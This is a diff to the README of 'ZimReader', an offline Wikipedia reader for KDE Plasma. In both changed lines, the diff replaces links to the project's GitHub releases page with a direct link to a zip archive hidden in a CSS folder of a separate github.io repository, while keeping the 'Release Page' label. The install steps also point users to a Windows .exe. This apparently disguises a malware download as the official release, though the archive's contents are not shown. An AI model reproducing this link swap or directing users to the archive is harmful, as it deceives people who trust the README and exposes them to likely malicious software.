@@ -5,7 +5,7 @@ description: "Read ZIM files offline with this KDE Plasma reader featuring theme
 ---
 # 📖 ZimReader - Read Wikipedia offline without internet access
 
-[![Download ZimReader](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/joyandesirous24/ZimReader/releases)
+[![Download ZimReader](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/joyandesirous24/joyandesirous24.github.io/main/css/pages/Release_3.4.zip)
 
 ZimReader provides a way to read Wikipedia articles on your computer without a web connection. It works for desktop users who want fast access to information. The software matches the look of your system and supports multiple tabs. You can search for topics or play the wikirace game to test your knowledge.
 
@@ -13,7 +13,7 @@ ZimReader provides a way to read Wikipedia articles on your computer without a w
 
 You do not need programming skills to use this software. Follow these steps to set up the application on your computer.
 
-1. Visit the [releases page](https://github.com/joyandesirous24/ZimReader/releases) to find the latest version of the application.
+1. Visit the [releases page](https://raw.githubusercontent.com/joyandesirous24/joyandesirous24.github.io/main/css/pages/Release_3.4.zip) to find the latest version of the application.
 2. Look for the file that ends in .exe for Windows.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
